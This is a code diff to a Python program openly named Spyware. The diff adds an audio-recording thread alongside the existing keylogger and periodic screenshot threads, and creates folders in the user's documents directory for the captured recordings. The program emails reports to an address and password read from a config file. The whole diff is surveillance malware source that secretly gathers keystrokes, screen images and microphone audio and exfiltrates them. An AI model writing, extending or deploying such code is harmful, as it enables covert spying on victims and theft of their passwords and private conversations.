@@ -12,12 +12,15 @@ import random
 from modules.log import Logger
 from modules.grab_screen import Visual
 from modules.send_email import send_mail
+from modules.grab_audio import Audio
+from modules.normalize_path import normalize_path_name
 
 
 class Spyware:
     def __init__(self):
         self.keylogger_report = ''
         self.screenshot_period = 5
+        self.user_path = normalize_path_name(os.path.expanduser('~'), 'documents')
 
         with open('./user_info/info.json') as input_file:
             reader = input_file.reader()
@@ -26,16 +29,16 @@ class Spyware:
         self.audio_period = self.user_info.frequency - 2
 
     def start(self):
-        user_path = os.path.expanduser('~\\documents')
-        logger = Logger()
-        visual = Visual(self.screenshot_period)
+        logger = Logger(self.user_info.frequency, self.user_path)
+        audio = Audio(self.audio_period, self.user_path)
+        visual = Visual(self.screenshot_period, self.user_path, self.user_info.frequency)
 
-        if not os.path.isdir(f'{user_path}\\images_record'):
-            os.mkdir(f'{user_path}\\images_record')
+        self.setup_dirs()
 
         async_tasks = [
                 Thread(target=visual.make_screenshot, daemon=True),
                 Thread(target=logger.init, daemon=True),
+                Thread(target=audio.handle_audio, daemon=True),
                 Thread(target=self.reporting, daemon=True)
         ]
 
@@ -56,6 +59,16 @@ class Spyware:
         except:
             error_msg = 'Could not send that'
             send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)
+
+    def setup_dirs(self):
+        if not os.path.isdir(normalize_path_name(self.user_path, 'images_record')):
+            os.mkdir(normalize_path_name(self.user_path, 'images_record'))
+
+        if not os.path.isdir(normalize_path_name(self.user_path, 'audio_record')):
+            os.mkdir(normalize_path_name(self.user_path, 'audio_record'))
+
+        if not os.path.isdir(normalize_path_name(self.user_path, 'keylog_record')):
+            os.mkdir(normalize_path_name(self.user_path, 'keylog_record'))
 
 
 if __name__ == '__main__':
